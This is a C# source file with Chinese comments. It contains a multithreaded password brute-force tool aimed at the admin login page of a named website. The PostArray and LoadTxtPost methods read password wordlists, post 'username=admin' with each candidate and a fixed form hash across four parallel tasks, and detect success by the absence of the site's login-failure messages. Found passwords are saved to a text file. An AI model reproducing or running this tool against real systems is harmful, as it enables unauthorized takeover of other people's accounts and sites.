using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace PostNodify
{
    public static class PostHelper
    {
        public static void HttpWebRequestPost(string url, string xml)
        {
            UTF8Encoding encoding = new UTF8Encoding();
            byte[] data = encoding.GetBytes(xml);
            HttpWebRequest webRequest = (HttpWebRequest)WebRequest.Create(url);
            webRequest.Method = "GET";
            webRequest.ContentType = "text/xml";
            webRequest.ContentLength = data.Length;
            Stream newStream = webRequest.GetRequestStream();
            newStream.Write(data, 0, data.Length);
            newStream.Close();
            HttpWebResponse myResponse = (HttpWebResponse)webRequest.GetResponse();
            StreamReader reader = new StreamReader(myResponse.GetResponseStream(), Encoding.UTF8);
            Console.WriteLine(reader.ReadToEnd());
        }
        public static async void Post(string url, string xml)
        {
            UTF8Encoding encoding = new UTF8Encoding();
            byte[] data = encoding.GetBytes(xml);
            HttpClient hc = new HttpClient();
            ByteArrayContent bt = new ByteArrayContent(data);
            var response = await hc.PostAsync(url, bt);
            Console.WriteLine(await response.Content.ReadAsStringAsync());
        }
        /// <summary>
        /// 表单提交
        /// </summary>
        /// <param name="url">提交的地址</param>
        /// <param name="postDataStr">提交的参数</param>
        /// <returns></returns>
        public static string PostFrom(string url, string postDataStr)
        {
            string retString = "";

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.CookieContainer = new CookieContainer();
            CookieContainer cookie = request.CookieContainer;//如果用不到Cookie，删去即可  
                                                             //以下是发送的http头，随便加，其中referer挺重要的，有些网站会根据这个来反盗链  
            request.Referer = "http://ceshi.tombsale.com/admin/user/login";
            request.Accept = "Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
            request.Headers["Accept-Language"] = "zh-CN,zh;q=0.";
            request.Headers["Accept-Charset"] = "GBK,utf-8;q=0.7,*;q=0.3";
            request.UserAgent = "User-Agent:Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1";
            request.KeepAlive = true;
            //上面的http头看情况而定，但是下面俩必须加  
            request.ContentType = "application/x-www-form-urlencoded";
            request.Method = "POST";

            Encoding encoding = Encoding.UTF8;//根据网站的编码自定义  
            byte[] postData = encoding.GetBytes(postDataStr);//postDataStr即为发送的数据，格式还是和上次说的一样  
            request.ContentLength = postData.Length;
            Stream requestStream = request.GetRequestStream();

            requestStream.Write(postData, 0, postData.Length);
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            Stream responseStream = response.GetResponseStream();
            //如果http头中接受gzip的话，这里就要判断是否为有压缩，有的话，直接解压缩即可  
            if (response.Headers["Content-Encoding"] != null && response.Headers["Content-Encoding"].ToLower().Contains("gzip"))
            {
                responseStream = new GZipStream(responseStream, CompressionMode.Decompress);
            }

            StreamReader streamReader = new StreamReader(responseStream, encoding);
            retString = streamReader.ReadToEnd();

            streamReader.Close();
            responseStream.Close();
            return retString;
        }
        /// <summary>
        /// 提交切割后的数组
        /// </summary>
        /// <param name="line">需要提交的数据</param>
        /// <param name="tasknum">线程的编号</param>
        /// <returns></returns>
        public static string PostArray(string[] line, int tasknum)
        {
            foreach (var item in line)
            {
                string result = PostFrom("http://ceshi.tombsale.com/admin/user/login", $"username=admin&password={item}&__hash__=d7b4af35b71c22996adb904671f0ecd3_054874de5e03895f0b95ac76534b755b");
                if (!result.Contains("操作失败"))
                {
                    Console.WriteLine(item + "=" + tasknum);
                    return item;
                }
                Console.WriteLine(item + "=" + tasknum);
            }
            return "";

        }
        /// <summary>
        /// 使用TASK提交数据。
        /// </summary>
        /// <param name="line">数组</param>
        /// <param name="url">地址</param>
        /// <param name="tasknum">线程序号</param>
        /// <returns></returns>
        public static string TaskArrayPost(string[] line, string url, int tasknum)
        {
            string pws = "";
            int count = line.Length / tasknum;
            int yu = line.Length % tasknum;
            Task[] tasks = new Task[tasknum];
            for (int i = 0; i < tasknum; i++)
            {
                var l = line.Skip(count * i).Take(count).ToArray();
                tasks[i] = Task.Factory.StartNew(() =>
                {
                    string pw = PostArray(l, i);
                    if (pw != "")
                    {
                        pws = pw;
                        SaveFile.ToTxt(Directory.GetCurrentDirectory() + "密码.txt", pws);
                        foreach (var item in tasks)
                        {
                            item.Dispose();
                        }
                    }
                });
            }
            try
            {
                Task.WaitAll(tasks);
            }
            catch (AggregateException ae)
            {
                Console.WriteLine(ae.Message);
                SaveFile.ToTxt(ae.Message, Directory.GetCurrentDirectory() + @"\异常.txt");
                throw ae.Flatten();
            }
            return pws;
        }
        /// <summary>
        /// 同时开4个TASK读取4个文本,请求
        /// </summary>
        /// <param name="path">文件夹路径</param>
        /// <param name="url">请求地址</param>
        public static string LoadFilesPost(string path, string url)
        {
            var files = Directory.GetFiles(path).ToList();
            Task[] tasks = new Task[4];
            string pw = "";
            while (true)
            {
                tasks[0] = Task.Factory.StartNew(() =>
                {
                    pw = LoadTxtPost(url, GetFile(files), tasks, 0);
                });
                tasks[1] = Task.Factory.StartNew(() =>
                {
                    pw = LoadTxtPost(url, GetFile(files), tasks, 1);
                });
                tasks[2] = Task.Factory.StartNew(() =>
                {
                    pw = LoadTxtPost(url, GetFile(files), tasks, 2);
                });
                tasks[3] = Task.Factory.StartNew(() =>
                {
                    pw = LoadTxtPost(url, GetFile(files), tasks, 3);
                });
                Task.WaitAll(tasks);
                if (pw != "" || files.Count == 0)
                {
                    return pw;
                }
            }

            //return pw;
        }

        private static string GetFile(List<string> files)
        {
            lock (files)
            {
                string filePath = "";
                if (files.Count > 0)
                {
                    filePath = files[0];
                    files.Remove(filePath);
                }
                return filePath;
            }
        }

        /// <summary>
        /// 读取文档post
        /// </summary>
        /// <param name="url">请求的地址</param>
        /// <param name="file">文本Path</param>
        /// <param name="tasks">开启的4个线程</param>
        private static string LoadTxtPost(string url, string file, Task[] tasks, int taskId)
        {
            string[] strs0 = File.ReadAllLines(file);
            string pw = "";
            foreach (var item in strs0)
            {

                //提交表单
                try
                {
                    string result = PostFrom(url, $"username=admin&password={item}&__hash__=d7b4af35b71c22996adb904671f0ecd3_054874de5e03895f0b95ac76534b755b");
                    Console.WriteLine(item + $"={taskId}");
                    if (!result.Contains("用户名或密码不正确"))
                    {
                        Console.WriteLine(result);
                        SaveFile.ToTxt(result, Directory.GetCurrentDirectory() + "/非密码错误.txt");
                        pw = item;
                    }
                }
                catch (AggregateException ex)
                {
                    Console.WriteLine(ex.Message);
                    SaveFile.ToTxt(ex.Message, Directory.GetCurrentDirectory() + "/异常.txt");
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    SaveFile.ToTxt(ex.Message, Directory.GetCurrentDirectory() + "/异常.txt");
                }
                if (pw != "")
                {
                    //保存密码
                    SaveFile.ToTxt(pw, Directory.GetCurrentDirectory() + "/密码.txt");
                    foreach (var tk in tasks)
                    {
                        tk.Dispose();
                    }
                    break;
                }
            }
            SaveFile.ToTxt(pw, Directory.GetCurrentDirectory() + "/已读文档.txt");
            return pw;
        }
    }
}
